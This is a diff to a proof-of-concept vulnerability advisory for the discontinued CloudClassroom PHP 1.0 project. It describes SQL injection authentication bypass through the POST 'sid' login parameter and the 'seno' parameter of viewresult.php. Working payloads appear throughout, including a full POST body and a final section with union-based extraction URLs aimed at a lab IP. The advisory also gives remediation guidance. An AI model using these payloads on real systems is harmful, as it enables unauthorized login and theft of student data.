@@ -1,13 +1,13 @@
 # Cloud-Classroom-PHP-1.0---Poc2
 
 
-Presentation: SQL Injection Bypass Authentication in viewresult.php
-Security vulnerability:
-SQL Injection - Authentication Bypass
+Presentation: SQL Injection Bypass Authentication via POST sid parameter
+
+Security vulnerability: SQL Injection - Authentication Bypass
 
 Vulnerability Type: Injection
 
-Affected Component: viewresult.php page - parameter seno via POST
+Affected Component: loginlinkstudent endpoint — POST parameter sid
 
 Software: CloudClassroom PHP Project
 
@@ -15,51 +15,49 @@ Version: 1.0 (discontinued)
 
 Business Area: Education / e-Learning Platforms
 
-Description of the issue: The viewresult.php page takes a GET parameter seno which is used directly in an SQL query without any sanitization or parameterization:
+Description of the issue:
+The login functionality accepts a POST parameter sid (student ID) and directly uses it in an SQL query without sanitization or parameterization. This enables an attacker to inject SQL code that bypasses authentication.
 
-$seno = $_GET['seno'];
-$sql = "SELECT * FROM result WHERE Eno='$seno'";
-This allows attackers to inject SQL code in the seno parameter, bypassing authentication or any authorization logic.
+Example vulnerable query (simplified):
 
-Impact: 
+SELECT * FROM students WHERE sid = '$sid' AND pass = '$pass';
+By injecting SQL in sid, the attacker can manipulate the query logic to always evaluate to true, bypassing login.
 
-Allows attacker to bypass authentication or filters by injecting always-true conditions.
+Impact:
+Allows bypassing authentication without valid credentials.
 
-Can return all rows in the result table regardless of the enrollment number.
+Grants unauthorized access to protected areas of the application.
 
-May expose sensitive data such as student results or other protected information.
+Potential access to sensitive student data.
 
-Steps to reproduce: Access the page with a crafted URL like:
+Example of malicious payload in sid:
 
-http://target/viewresult.php?seno=' OR '1'='1
-This will transform the query into:
+1' or 1=1-- -
+This payload closes the string, adds an always-true condition or 1=1, and comments out the rest of the query.
 
-SELECT * FROM result WHERE Eno='' OR '1'='1'
-Which returns all results, bypassing any filtering by enrollment number.
+Example full POST request (payload URL-encoded):
 
-Example payloads for authentication bypass:
-Payload	Explanation
-' OR '1'='1	Always true condition, returns all rows
-' OR 1=1 -- -	Comments out rest of query, returns all rows
-anything' OR 'x'='x	Bypass with always true condition
+sid=1' or 1=1-- -&pass=a&login=
 
-Example full URL for bypass:
 
-http://target/viewresult.php?seno=' OR '1'='1
-Or
-http://target/viewresult.php?seno=' OR 1=1 -- -
+Expected behavior after injection:
+The login check bypasses password verification.
 
-Severity: High - bypasses any enrollment-based filtering, potentially exposing sensitive student data.
+The server grants access or session initialization for the attacker.
 
-Recommended Fix: Use prepared statements with bound parameters to prevent injection.
+Severity: High — allows full authentication bypass.
 
-Validate and sanitize all user input.
+Recommended Fix: Use parameterized queries (prepared statements) for sid and pass.
 
-Use least privilege on DB user.
+Properly sanitize and validate inputs.
+
+Employ strong authentication and session management.
 
 References:
 CWE-89: SQL Injection
+
 OWASP SQL Injection Prevention Cheat Sheet
+
 
 
 SQL-Injection Bypass-Authentication
@@ -74,3 +72,36 @@ Full-path disclosure
 
 
 <img width="1330" height="269" alt="image" src="https://github.com/user-attachments/assets/97d8405e-0830-4ee6-81e6-9e9557b082a8" />
+
+
+
+- classrooms/viewresult.php
+
+By bypassing we can access viewresult.php via GET, the endpoint is also subject to SQL injection, we can extract data via SQL UNION based.
+
+
+http://10.10.91.146:20000/classrooms/viewresult.php?seno=146891650%27%20OR%20%271%27%3D%271%27%20--%20-
+
+<img width="1033" height="520" alt="image" src="https://github.com/user-attachments/assets/0db4277a-b135-4046-9744-a27d30a2ed98" />
+
+
+123'%20ORDER%20BY%201%20--%20-
+
+<img width="958" height="335" alt="image" src="https://github.com/user-attachments/assets/9ec7cd0b-7cf7-46e6-a4cf-43c586c86fee" />
+
+
+123%27%20ORDER%20BY%205%20--%20-
+
+<img width="951" height="443" alt="image" src="https://github.com/user-attachments/assets/96f31485-4e35-43b3-886d-6d429edc8752" />
+
+
+' UNION SELECT 1,2,3,4 -- -
+
+<img width="964" height="354" alt="image" src="https://github.com/user-attachments/assets/ab91a095-9adc-453b-9a54-f9280b74a06b" />
+
+%27%20UNION%20SELECT%201,@@version,3,4%20--%20-
+
+
+<img width="1040" height="358" alt="image" src="https://github.com/user-attachments/assets/6ace65f7-ea6b-4b53-a09f-4624b37658fd" />
+
+
